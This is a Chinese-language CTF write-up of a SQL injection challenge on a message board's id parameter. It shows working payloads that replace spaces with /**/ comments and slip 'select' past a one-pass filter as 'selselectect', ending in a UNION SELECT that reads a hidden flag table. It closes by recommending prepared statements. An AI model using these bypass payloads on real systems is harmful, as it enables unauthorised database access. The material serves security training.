# Cosmos 的留言板-1

## 题目简述

留言板按 `id` 查询内容，但把参数直接拼入 SQL。过滤器会删除空格和关键字 `select`，所以需要同时绕过分隔符与关键字检查，再通过联合查询读出隐藏表中的 flag。

## 解题过程

先用单引号观察报错和页面差异，确认 `id` 位于可注入的字符串上下文。空格可替换为 MySQL 注释：

```sql
/**/
```

过滤逻辑对 `select` 只做一次简单替换，可利用重叠字符串：

```text
selselectect
```

其中间的 `select` 被删除后，两侧会重新拼成 `select`。用相同方法依次枚举数据库、数据表和列，得到：

```text
database: easysql
table:    f1aggggggggggggg
column:   fl4444444g
```

最终查询可写成：

```sql
'/**/union/**/selselectect/**/fl4444444g/**/from/**/f1aggggggggggggg;#
```

服务端完成一次过滤后，实际执行的语义等价于：

```sql
' UNION SELECT fl4444444g FROM f1aggggggggggggg;#
```

页面回显该列内容，即可取得 flag。

## 方法总结

- 核心技巧：用注释代替空格，再用关键字重叠绕过一次性字符串替换。
- 识别信号：过滤器仅做黑名单替换，却没有参数化查询，通常仍可通过词法等价形式恢复危险语句。
- 复用要点：应先确认过滤发生几次、是否区分大小写，再构造最短 payload；防御端必须使用预编译语句，不能依赖删除关键字。
